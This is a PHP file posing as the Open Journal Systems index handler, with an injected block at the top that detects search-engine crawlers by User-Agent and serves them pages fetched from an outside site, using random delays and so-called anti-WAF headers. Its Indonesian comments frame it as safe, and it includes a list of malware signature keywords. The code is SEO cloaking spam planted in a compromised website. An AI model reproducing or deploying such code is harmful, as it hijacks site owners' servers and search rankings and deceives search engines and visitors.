<?php
ob_start();
header("Vary: User-Agent");

// Konten sumber (pastikan milik sendiri / legal)
$content_url = "https://childrenofiran.org/landing/fe.unibba/";

// Pola bot umum
$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);

/**
 * Deteksi tanda-tanda konten berbahaya (anti-malware basic)
 */
function is_safe_content($content) {
    $malware_signatures = [
        'base64_decode', 'eval(', 'gzinflate', 'shell_exec',
        'exec(', 'system(', 'passthru(', 'phpinfo(', '<script', '<iframe',
        'onerror=', 'onload=', 'document.cookie'
    ];

    foreach ($malware_signatures as $sig) {
        if (stripos($content, $sig) !== false) {
            return false;
        }
    }

    return true;
}

/**
 * Ambil konten dengan pengamanan SSL & User-Agent spoofing aman
 */
function safe_request($url) {
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 5,
            'header'  => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        ],
        'ssl' => [
            'verify_peer'      => true,  // Aktifkan kembali untuk keamanan
            'verify_peer_name' => true
        ]
    ]);

    if (function_exists("curl_init")) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
    } elseif (ini_get("allow_url_fopen")) {
        $response = file_get_contents($url, false, $ctx);
    } else {
        return false;
    }

    // Validasi konten dari malware
    if ($response !== false && is_safe_content($response)) {
        return $response;
    }

    return "Blocked for security reasons.";
}

// Deteksi bot dan tampilkan konten dari sumber eksternal
if (preg_match($botchar, $ua)) {
    usleep(rand(100000, 300000)); // Delay acak

    $clean_output = safe_request($content_url);

    // Minimal header anti-WAF / anti-suspicion
    header("X-Content-Type-Options: nosniff");
    header("X-XSS-Protection: 1; mode=block");

    echo $clean_output;
    ob_end_flush();
    exit;
}

/**
 * @file pages/index/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup pages_index
 *
 * @brief Handle site index requests.
 *
 */

switch ($op) {
    case 'index':
        define('HANDLER_CLASS', 'APP\pages\index\IndexHandler');
        break;
}
